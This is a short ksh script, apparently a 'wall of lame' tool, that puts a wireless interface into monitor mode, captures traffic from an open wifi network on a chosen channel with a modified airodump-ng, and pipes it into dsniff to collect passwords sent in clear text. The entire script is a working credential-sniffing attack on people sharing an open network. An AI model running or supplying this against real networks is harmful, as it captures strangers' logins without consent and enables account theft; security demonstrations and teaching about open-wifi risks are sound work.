#!/usr/bin/env ksh

#.---------------------------------------------
#       (w|h)all of lame
#
# Parameters:
#             $1 ->  [int] channel of open wifi network
#
#,---------------------------------------------

IFACE='wlan0'
FIFO='whol_pipe'
STATUS=0
mkfifo $FIFO

destruct() {
    if [[ "$STATUS" -gt 0 ]] ; then return; fi
    echo "exitting.."
    STATUS=$((STATUS+1))
    if [[ "$1" != "" ]] ; then kill $1; fi
    airmon-ng stop mon0
    rm $FIFO
}

airmon-ng start $IFACE 0

airodump-ng_wholmod -o pcap -w $FIFO -t OPN -c $1 mon0 -p -q&
APID=$!

trap "destruct $APID" INT

dsniff -m -p $FIFO

destruct $APID
